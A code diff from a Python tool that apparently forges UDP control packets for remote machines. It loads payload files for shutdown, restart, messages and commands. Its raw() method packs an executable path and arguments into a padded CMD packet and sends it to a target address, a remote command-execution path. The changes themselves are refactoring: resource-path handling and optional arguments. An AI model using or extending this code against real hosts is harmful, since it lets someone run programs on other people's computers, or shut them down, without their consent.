@@ -52,11 +52,13 @@ def _resource_dir(relative_dir: str) -> str:
     :return: 资源的实际路径
     """
     if hasattr(sys, "_MEIPASS"):
-        # noinspection PyProtectedMember
-        base_dir = sys._MEIPASS
+        base_dir = sys._MEIPASS # type: ignore
+        return os.path.join(base_dir, relative_dir)
     else:
-        base_dir = os.path.abspath(".")
-    return os.path.join(base_dir, relative_dir)
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        return os.path.join(script_dir, relative_dir)
+
+
 
 
 def _read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str, windowed_dir: str) -> None:
@@ -210,21 +212,23 @@ class Target:
         self._safe_sendto(packet, self.address)
         logger.info(f"MSG: {_shorten(content)} -> {self.address[0]}:{self.address[1]}")
 
-    def raw(self, executable: str, args: str) -> None:
+    def raw(self, executable: str, args: Optional[str] = None) -> None:
         """
         编码并发送命令。
         :param executable: 可执行文件的绝对路径
         :param args: 完整的命令行参数
         """
-
         encoded_executable = self._encode_cmd(executable)
-        encoded_args = self._encode_cmd(args)
+        encoded_args = self._encode_cmd(args) if args is not None else None
 
         packet = bytearray(Payload.CMD)
         packet.extend(encoded_executable)
         packet.extend(b"\x00" * (512 - len(encoded_executable)))  # 填充路径部分
-        packet.extend(encoded_args)
-        packet.extend(b"\x00" * (324 - len(encoded_args)))  # 填充参数部分
+        if encoded_args is None:
+            packet.extend(b"\x00" * 324)
+        else:
+            packet.extend(encoded_args)
+            packet.extend(b"\x00" * (324 - len(encoded_args)))  # 填充参数部分
         packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")  # 固定结尾
 
         self._safe_sendto(packet, self.address)
